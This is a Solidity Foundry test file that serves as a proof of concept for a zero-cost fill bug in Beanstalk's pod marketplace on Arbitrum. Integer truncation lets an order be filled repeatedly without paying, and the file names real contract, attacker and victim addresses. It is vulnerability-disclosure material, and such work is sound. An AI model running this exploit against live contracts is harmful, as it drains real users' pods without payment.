// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// forge test --match-contract Beanstalk_FillPodOrder_ZeroBeans \
//   --fork-url https://arb1.arbitrum.io/rpc -vvv

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBeanstalk {
    enum To { EXTERNAL, INTERNAL, EXTERNAL_OR_INTERNAL, INTERNAL_TOLERANT }
    enum From { EXTERNAL, INTERNAL, EXTERNAL_OR_INTERNAL, EXTERNAL_TOLERANT }

    // Note: pricePerPod is uint24 (max 16_777_215), divisor is 1_000_000
    struct PodOrder {
        address orderer;
        uint256 fieldId;
        uint24  pricePerPod;
        uint256 maxPlaceInLine;
        uint256 minFillAmount;
    }

    function createPodOrder(
        PodOrder calldata podOrder,
        uint256 beanAmount,
        From mode
    ) external payable returns (bytes32 id);

    function fillPodOrder(
        PodOrder calldata podOrder,
        uint256 index,
        uint256 start,
        uint256 amount,
        To mode
    ) external payable;

    function cancelPodOrder(
        PodOrder calldata podOrder,
        To mode
    ) external payable;

    function getPodOrder(bytes32 id) external view returns (uint256);
    function getOrderId(PodOrder calldata podOrder) external pure returns (bytes32);

    function plot(address account, uint256 fieldId, uint256 index) external view returns (uint256);
    function totalHarvestable(uint256 fieldId) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

/**
 * @title Beanstalk_FillPodOrder_ZeroBeans
 * @notice PoC: _fillPodOrder() missing require(costInBeans > 0)
 *
 * Root cause:
 *   costInBeans = (podAmount * pricePerPod) / 1_000_000
 *   When podAmount * pricePerPod < 1_000_000, costInBeans = 0.
 *   The order's bean balance is NEVER decremented, so the same order
 *   can be filled an unlimited number of times.  Each filler loses
 *   pods while receiving 0 beans.
 *
 * Compare to Listing.sol (fixed June 2025):
 *   _fillListing:  require(beanPayAmount > 0, "Marketplace: Zero payment.")
 *   _fillPodOrder: NO equivalent check  <-- bug
 *
 * All accounts are real on-chain addresses; no storage manipulation or
 * artificial token minting is used.
 *
 * Attacker: 0x2e5120b6aab3742e3a9c8dce46e79192bbee3bf3
 *   Real BEAN balance: 507,858,726 units (≈507 BEAN)
 *
 * Victim: 0x5b45b0A5C1e3D570282bDdfe01B0465c1b332430
 *   Plot index:  980_532_104_448_065
 *   Pod amount:  2_028_637_197
 *   totalHarvestable(0) at fork: 2_301_108_612 (plot is unharvestable)
 */
contract Beanstalk_FillPodOrder_ZeroBeans is Test {
    address constant L2_BEANSTALK = 0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70;
    address constant BEAN         = 0xBEA0005B8599265D41256905A9B3073D397812E4;

    IBeanstalk beanstalk = IBeanstalk(L2_BEANSTALK);
    IERC20     bean      = IERC20(BEAN);

    // Real on-chain attacker: holds 507,858,726 BEAN units (verified)
    address constant ATTACKER = 0x2E5120b6aAb3742E3A9c8dCE46e79192bbee3Bf3;

    // Real on-chain pod holder (from Sow event tx 0xda66178...)
    address constant VICTIM   = 0x5b45b0A5C1e3D570282bDdfe01B0465c1b332430;
    uint256 constant FIELD_ID  = 0;
    uint256 constant PLOT_IDX  = 980_532_104_448_065;
    uint256 constant PLOT_SIZE = 2_028_637_197; // pods at PLOT_IDX (on-chain)
    uint256 constant ORDER_BEANS = 1e6;          // 1 BEAN (6 decimals) for the order

    function setUp() public {
        vm.createSelectFork("https://arb1.arbitrum.io/rpc");

        // Verify real attacker has enough BEAN (no minting)
        assertGe(bean.balanceOf(ATTACKER), ORDER_BEANS, "attacker has real BEAN");
        // Verify real victim has the plot
        assertEq(beanstalk.plot(VICTIM, FIELD_ID, PLOT_IDX), PLOT_SIZE, "victim has pods");
        // Confirm plot is unharvestable
        assertGt(PLOT_IDX, beanstalk.totalHarvestable(FIELD_ID), "plot above harvestable line");
    }

    // -----------------------------------------------------------------------
    // CONTROL: fair fill - pricePerPod == 1_000_000, podAmount == 1
    //   costInBeans = (1 * 1_000_000) / 1_000_000 = 1 → victim gets 1 bean ✓
    // -----------------------------------------------------------------------
    function test_control_fairFill() public {
        IBeanstalk.PodOrder memory order = IBeanstalk.PodOrder({
            orderer:        ATTACKER,
            fieldId:        FIELD_ID,
            pricePerPod:    1_000_000,      // exactly 1 bean per pod
            maxPlaceInLine: type(uint256).max,
            minFillAmount:  1
        });

        vm.startPrank(ATTACKER);
        bean.approve(L2_BEANSTALK, ORDER_BEANS);
        beanstalk.createPodOrder(order, ORDER_BEANS, IBeanstalk.From.EXTERNAL);
        vm.stopPrank();

        bytes32 orderId        = beanstalk.getOrderId(order);
        uint256 orderBefore    = beanstalk.getPodOrder(orderId);
        uint256 victimBefore   = bean.balanceOf(VICTIM);
        assertEq(orderBefore, ORDER_BEANS, "order funded");

        vm.prank(VICTIM);
        beanstalk.fillPodOrder(order, PLOT_IDX, 0, 1, IBeanstalk.To.EXTERNAL);

        uint256 victimAfter  = bean.balanceOf(VICTIM);
        uint256 orderAfter   = beanstalk.getPodOrder(orderId);
        // After start=0 fill of 1 pod: original plot consumed, remainder at PLOT_IDX+1
        uint256 remainder    = beanstalk.plot(VICTIM, FIELD_ID, PLOT_IDX + 1);

        assertEq(victimAfter - victimBefore, 1,             "CONTROL: victim got 1 bean");
        assertEq(remainder,                  PLOT_SIZE - 1, "CONTROL: remainder at PLOT_IDX+1");
        assertEq(beanstalk.plot(VICTIM, FIELD_ID, PLOT_IDX), 0, "CONTROL: original plot cleared");
        assertLt(orderAfter, orderBefore,                   "CONTROL: order balance decreased");

        console.log("[CONTROL] Victim beans received : %d", victimAfter - victimBefore);
        console.log("[CONTROL] Order remaining beans : %d", orderAfter);
    }

    // -----------------------------------------------------------------------
    // EXPLOIT: zero-bean fill - pricePerPod == 999_999, podAmount == 1
    //   costInBeans = (1 * 999_999) / 1_000_000 = 0  (integer truncation!)
    //   → order never decremented → perpetual free pod drain
    // -----------------------------------------------------------------------
    function test_exploit_zeroBeanFill() public {
        IBeanstalk.PodOrder memory poison = IBeanstalk.PodOrder({
            orderer:        ATTACKER,
            fieldId:        FIELD_ID,
            pricePerPod:    999_999,         // 1 below the 1:1 threshold → rounds to 0
            maxPlaceInLine: type(uint256).max,
            minFillAmount:  1
        });

        // Attacker deposits 1 BEAN backing for the order (real on-chain balance)
        vm.startPrank(ATTACKER);
        bean.approve(L2_BEANSTALK, ORDER_BEANS);
        beanstalk.createPodOrder(poison, ORDER_BEANS, IBeanstalk.From.EXTERNAL);
        vm.stopPrank();

        bytes32 orderId     = beanstalk.getOrderId(poison);
        uint256 orderBefore = beanstalk.getPodOrder(orderId);
        assertEq(orderBefore, ORDER_BEANS, "order funded");

        // ---- Fill #1: victim loses 1 pod, receives 0 beans ----
        uint256 victimBefore = bean.balanceOf(VICTIM);

        vm.prank(VICTIM);
        beanstalk.fillPodOrder(poison, PLOT_IDX, 0, 1, IBeanstalk.To.EXTERNAL);

        uint256 victimAfter1      = bean.balanceOf(VICTIM);
        uint256 orderAfterFill1   = beanstalk.getPodOrder(orderId);
        uint256 remainderAtIdx1   = beanstalk.plot(VICTIM, FIELD_ID, PLOT_IDX + 1);

        assertEq(victimAfter1 - victimBefore, 0,             "EXPLOIT: victim got 0 beans");
        assertEq(beanstalk.plot(VICTIM, FIELD_ID, PLOT_IDX), 0, "EXPLOIT: original plot taken");
        assertEq(remainderAtIdx1,              PLOT_SIZE - 1, "EXPLOIT: remainder correct");
        assertEq(orderAfterFill1,              ORDER_BEANS,   "EXPLOIT: order NOT decremented");

        console.log("[EXPLOIT] Fill #1 - victim beans received  : %d", victimAfter1 - victimBefore);
        console.log("[EXPLOIT] Fill #1 - order beans remaining  : %d (unchanged)", orderAfterFill1);

        // ---- Fill #2: same order, remainder plot - order still not decremented ----
        vm.prank(VICTIM);
        beanstalk.fillPodOrder(poison, PLOT_IDX + 1, 0, 1, IBeanstalk.To.EXTERNAL);

        uint256 orderAfterFill2 = beanstalk.getPodOrder(orderId);
        assertEq(bean.balanceOf(VICTIM),  0,           "EXPLOIT: victim still 0 beans after fill #2");
        assertEq(orderAfterFill2,         ORDER_BEANS, "EXPLOIT: order STILL not decremented after fill #2");

        console.log("[EXPLOIT] Fill #2 - order beans remaining  : %d (still unchanged)", orderAfterFill2);
        console.log("[EXPLOIT] Order is perpetual - can drain all fillers indefinitely");

        // ---- Attacker withdraws their 1 BEAN deposit - net cost = 0 ----
        uint256 attackerBefore = bean.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        beanstalk.cancelPodOrder(poison, IBeanstalk.To.EXTERNAL);
        uint256 attackerAfter = bean.balanceOf(ATTACKER);

        assertEq(attackerAfter - attackerBefore, ORDER_BEANS, "EXPLOIT: attacker recovered deposit");
        console.log("[EXPLOIT] Attacker recovered BEAN deposit   : %d", attackerAfter - attackerBefore);
        console.log("[EXPLOIT] Net attacker cost = 0 BEAN");
    }
}
